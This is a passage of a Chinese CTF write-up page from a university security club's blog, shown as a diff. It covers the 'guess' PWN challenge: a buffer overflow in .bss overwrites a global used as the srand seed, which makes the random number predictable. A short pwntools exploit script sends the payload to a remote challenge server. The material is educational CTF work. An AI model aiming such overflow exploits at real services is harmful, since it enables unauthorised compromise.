+<p>​        同样的自变量，同样的函数，就会得出同样的因变量。</p>
+<p>​        所以srand()函数不变的前提下，我们只需要改变seed的值就可以控制最终得出的随机数。</p>
+<p>​        在程序中我们看到srand()的参数，也就是seed，用的是a[0]，而a[0]在main函数第12行处被一个未初始化的变量赋值过，也就是说是个不确定的值。我们要做的就是覆写这个a[0]。</p>
+<p>​        我们假设a[0]等于1，再求出来生成的随机数是多少。</p>
+<p>​        写个C程序用srand函数算一算：</p>
+<p><img src="https://s1.ax1x.com/2020/06/01/t8sWdK.png" alt="t8sWdK.png"></p>
+<p><a href="https://imgchr.com/i/t8sfIO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/06/01/t8sfIO.png" alt="t8sfIO.png"></a></p>
+<p>​        seed等于1是，rand()%100得出的结果为83。</p>
+<p>​        双击a变量，发现它位于程序的bss段，也就是说这是一个全局变量。</p>
+<p>!<img src="https://s1.ax1x.com/2020/06/01/t8scs1.png" alt="t8scs1.png"></p>
+<p>​        而在它上方有另一个全局变量b，这个变量在main函数中被用来输入姓名。</p>
+<p><img src="https://s1.ax1x.com/2020/06/01/t8sgqx.png" alt="t8sgqx.png"></p>
+<p>​        我们可以用read函数填充b变量，溢出到a，覆盖a[0]为1。</p>
+<p><img src="https://s1.ax1x.com/2020/06/01/t8sRZ6.png" alt="t8sRZ6.png"></p>
+<p>​        b的地址为：0x08049B4C，a的地址为：0x08049B60。计算可知，两者相距0x14字节。</p>
+<p>​        脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10000</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x14</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'First tell me who you are : \n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Do you know what I am thinking?\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">83</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>Donate comment here.</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              
+                 <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              
+                 <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/16/introduction/" rel="prev" title="武汉科技大学信息安全协会">
+      <i class="fa fa-chevron-left"></i> 武汉科技大学信息安全协会
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/01/30/s1rone_wp/" rel="next" title="WUST内部赛wp">
+      WUST内部赛wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#签到题"><span class="nav-number">1.1.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#我已备份好文件"><span class="nav-number">1.2.</span> <span class="nav-text">我已备份好文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#有点像甜饼"><span class="nav-number">1.3.</span> <span class="nav-text">有点像甜饼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyweb"><span class="nav-number">1.4.</span> <span class="nav-text">easyweb</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#还是写题爽"><span class="nav-number">2.1.</span> <span class="nav-text">还是写题爽</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cry"><span class="nav-number">2.2.</span> <span class="nav-text">Cry</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO"><span class="nav-number">3.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Are-u-ok？"><span class="nav-number">3.1.</span> <span class="nav-text">Are u ok？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#be-r"><span class="nav-number">3.2.</span> <span class="nav-text">be@r</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE"><span class="nav-number">4.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#maze"><span class="nav-number">4.1.</span> <span class="nav-text">maze</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezbabyre"><span class="nav-number">4.2.</span> <span class="nav-text">ezbabyre</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">5.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#overflow-still"><span class="nav-number">5.1.</span> <span class="nav-text">overflow_still</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rop-still"><span class="nav-number">5.2.</span> <span class="nav-text">rop_still</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#guess"><span class="nav-number">5.3.</span> <span class="nav-text">guess</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="WUST-AIS"
+      src="/uploads/logo.png">
+  <p class="site-author-name" itemprop="name">WUST-AIS</p>
+  <div class="site-description" itemprop="description">Join us</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/wust-ais" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;wust-ais" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:no-reply-wais@foxmail.com" title="E-Mail → mailto:no-reply-wais@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WUST-AIS</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.1
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
